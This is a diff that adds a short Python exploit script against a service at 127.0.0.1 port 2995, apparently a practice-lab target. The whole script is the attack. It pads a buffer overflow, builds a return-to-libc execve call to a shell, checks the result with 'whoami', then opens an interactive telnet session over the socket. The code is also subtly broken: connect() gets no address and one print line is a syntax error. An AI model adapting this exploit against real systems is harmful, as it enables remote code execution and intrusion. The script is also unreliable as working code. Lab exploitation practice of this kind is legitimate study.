@@ -1,0 +1,22 @@
+#!/usr/bin/env python
+import socket
+import struct
+import telnetlib
+
+HOST = '127.0.0.1'
+PORT = 2995
+s = socket.socket()
+s.connect()
+
+PADDING = 'user' + '\x00' + 'A' * (532 - 5)
+BASH = struct.pack('I', 1176511 + 0xb7e97000)
+EXECVE = struct.pack('I', 0x08048c0c) + 'RETA' + BASH + '\x00' * 8
+EXPLOIT = PADDING + EXECVE
+
+s.send(EXPLOIT + '\n')
+s.send('whoami\n')
+print('whoami: ' s.recv(1024))
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
